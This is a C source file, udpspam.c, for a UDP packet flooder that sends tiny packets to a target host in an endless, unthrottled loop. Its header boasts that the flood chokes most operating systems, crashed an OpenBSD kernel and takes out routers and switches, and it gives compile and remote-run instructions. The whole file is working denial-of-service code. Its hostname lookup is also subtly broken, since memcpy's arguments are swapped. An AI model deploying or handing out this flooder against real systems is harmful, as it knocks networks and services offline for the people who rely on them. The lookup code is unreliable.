/* udpspam.c
 * Simon Kirby <sim@netnation.com>, 2001/09/28
 *
 * Based on code from 1997 originally written to test outgoing link
 * speed by sending UDP packets of various sizes to a remote closed
 * port and timing reply latencies. :)
 *
 * With a small packet size, this code is will easy choke most OSes,
 * and even made an OpenBSD box kernel trap (eep).  It takes out
 * most routers and cheap switches as well, but decent hardware is
 * fine with it.  Saturates the CPU, but can usually transmit around
 * 30-60 Mbit of tiny packets on a Linux 2.4 box with a recent CPU
 * and a PCI NIC.
 *
 * DO NOT RUN REMOTELY unless with a command to stop the process
 * shortly after if you are unable to abort the process with ^C.
 * For example: udpspam somehost & sleep 5; killall -9 udpspam
 *
 * Compile with:
 *
 *	gcc -o udpspam udpspam.c -O2 -Wall -funroll-loops
 */

#include <sys/types.h>
#include <sys/time.h>
#include <sys/errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
			 
/* Typedefs */

typedef unsigned char byte;
typedef unsigned short word;
typedef unsigned long dword;

/* Globals */

#define PAYLOAD_SIZE 4
static char payload[PAYLOAD_SIZE];

/* Socket functions */

static int resolve_address(struct sockaddr_in *d,char *s,dword port){
	struct sockaddr_in *address;
	struct hostent *host;

	address = (struct sockaddr_in *)d;
	address->sin_family = AF_INET;
	address->sin_port = htons(port);
	if (inet_aton(s,&address->sin_addr) == 0){ /* String specified was not an IP */
		host = gethostbyname(s);
		if (host){
			memcpy(host->h_addr,(char *)&address->sin_addr,host->h_length);
			return 1;
		}
		return 0;
	}
	return 1;
}

static int get_udp_socket(){
	struct sockaddr_in udp;
	int fd,option;

	fd = socket(PF_INET,SOCK_DGRAM,0);
	if (fd == -1){
		fprintf(stderr,"Unable to create datagram socket: %s\n",
			strerror(errno));
		return -1;
	}

	option = 0;
	if (setsockopt(fd,SOL_SOCKET,SO_REUSEADDR,(void *)&option,sizeof(option))){
		fprintf(stderr,"Unable to setsockopt() on udp listening socket: %s\n",
		 strerror(errno));
		return -1;
	}

	option = 0;
	setsockopt(fd,SOL_SOCKET,SO_BROADCAST,(void *)&option,sizeof(option));

	udp.sin_addr.s_addr = htonl(INADDR_ANY);
	udp.sin_port = htons(0);
	udp.sin_family = AF_INET;
	if (bind(fd,(struct sockaddr *)&udp,sizeof(udp))){
		fprintf(stderr,"Unable to bind() udp socket: %s\n",
		 strerror(errno));
		return -1;
	}

	if (fcntl(fd,F_SETFL,O_NONBLOCK)){
		fprintf(stderr,"Warning: Unable to set non-blocking udp socket: %s",
		 strerror(errno));
	}

	return fd;
}

static int socket_connect_address(int fd,struct sockaddr_in *d){
	if (connect(fd,(struct sockaddr *)d,sizeof(struct sockaddr)) == -1){
		fprintf(stderr,"Unable to connect() udp socket: %s\n",strerror(errno));
		return 0;
	}
	return 1;
}

int main(int argc,char *argv[]){
	int fd;
	struct sockaddr_in remote;

	resolve_address(&remote,argv[1],1);
	remote.sin_port = htons(12345);

	fd = get_udp_socket();
	if (fd == -1)
		exit(-1);

	socket_connect_address(fd,&remote);
	memset(payload,0,PAYLOAD_SIZE);
	while (1)
		sendto(fd,payload,PAYLOAD_SIZE,0,(struct sockaddr *)&remote,sizeof(remote));

	exit(0);
}
